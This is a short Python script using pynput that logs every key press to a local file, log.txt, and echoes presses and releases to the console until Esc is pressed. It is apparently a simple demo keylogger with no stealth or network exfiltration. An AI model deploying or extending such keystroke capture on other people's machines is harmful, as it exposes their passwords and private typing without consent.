#!/usr/bin/env python3

from pynput import keyboard

def on_press(key):
    if hasattr(key, 'char'):
        print(f'alphanumeric key {key} pressed')
    else:
        print(f'special key {key} pressed')
    write_file([key])

def write_file(keys):
    with open('log.txt', 'a') as file:
        for key in keys:
            k = str(key).replace("'", "")
            file.write(f'{k}\n')

def on_release(key):
    print(f'{key} released')
    if key == keyboard.Key.esc:
        # Stop listener
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
